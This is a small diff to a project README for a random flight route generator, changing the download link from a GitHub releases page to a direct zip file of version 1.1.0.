@@ -5,7 +5,7 @@ You can choose between English or Portuguese version:
 "randomRoute-"language".exe
 
 Download link:
-https://github.com/lucasprad05/random-flightRoute/releases/tag/v1.0
+https://github.com/lucasprad05/random-flightRoute/files/9702967/randomRoute.1.1.0.zip
 
 <img src="./assets/img.png">
 
